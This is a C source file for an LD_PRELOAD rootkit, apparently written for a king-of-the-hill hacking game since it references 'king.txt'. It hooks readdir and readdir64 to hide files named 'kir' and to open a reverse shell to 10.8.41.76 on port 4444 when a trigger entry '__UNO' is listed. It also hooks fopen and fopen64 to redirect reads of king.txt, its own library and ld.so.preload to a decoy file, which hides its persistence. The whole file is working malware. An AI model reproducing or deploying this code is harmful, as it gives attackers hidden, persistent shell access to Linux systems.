#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dlfcn.h>
#include <dirent.h>
#include <arpa/inet.h>

#define FILENAME "kir"
#define REVERSE "__UNO"
#define REM_HOST4 "10.8.41.76"
#define REM_PORT 4444
#define LOC_PORT 65065

int ipv4_rev (void)
{
    const char* host = REM_HOST4;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(REM_PORT);
    inet_aton(host, &addr.sin_addr);

    struct sockaddr_in client;
    client.sin_family = AF_INET;
    client.sin_port = htons(LOC_PORT);
    client.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    bind(sockfd, (struct sockaddr*) &client, sizeof(client));

    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    for (int count = 0; count < 3; count++)
    {
        dup2(sockfd, count);
    }

    execve("/bin/sh", NULL, NULL);
    close(sockfd);

    return 0;
}

struct dirent *(*old_readdir)(DIR *dir);
struct dirent *readdir(DIR *dirp)
{
    old_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *dir;

    while (dir = old_readdir(dirp))
    {
	if(strcmp(dir->d_name, REVERSE) == 0) ipv4_rev();
	if(strstr(dir->d_name,FILENAME) == 0) break;
        //if(strstr(dir->d_name,FILENAME) == 0 || strstr(dir->d_name, PREFIX) == 0) break;
    }
    return dir;
}

struct dirent64 *(*old_readdir64)(DIR *dir);
struct dirent64 *readdir64(DIR *dirp)
{
    old_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    struct dirent64 *dir;

    while (dir = old_readdir64(dirp))
    {
	if(strcmp(dir->d_name, REVERSE) == 0) ipv4_rev();
        if(strstr(dir->d_name,FILENAME) == 0) break;
	//if(strstr(dir->d_name,FILENAME) == 0 || strstr(dir->d_name, PREFIX) == 0) break;
    }
    return dir;
}

FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode)
{
	FILE *fp;
	orig_fopen = dlsym(RTLD_NEXT, "fopen");
        if(strstr(pathname, "king.txt")) {
                pathname = "kirtrash";
        }
        else if(strstr(pathname, "libc.kir.so.6")) {
                pathname = "kirtrash";
        }
        else if(strstr(pathname, "ld.so.preload")) {
                pathname = "kirtrash";
        }

	printf("%s", strstr(pathname, "king.txt"));
	fp = orig_fopen(pathname, mode);
	return(fp);
}

FILE *(*orig_fopen64)(const char *pathname, const char *mode);
FILE *fopen64(const char *pathname, const char *mode)
{
	FILE* fp;
	orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");
        if(strstr(pathname, "king.txt")) {
                pathname = "kirtrash";
        }
        else if(strstr(pathname, "libc.kir.so.6")) {
                pathname = "kirtrash";
        }
        else if(strstr(pathname, "ld.so.preload")) {
                pathname = "kirtrash";
        }
	printf("%s", strstr(pathname, "king.txt"));
        fp = orig_fopen(pathname, mode);
        return(fp);
}
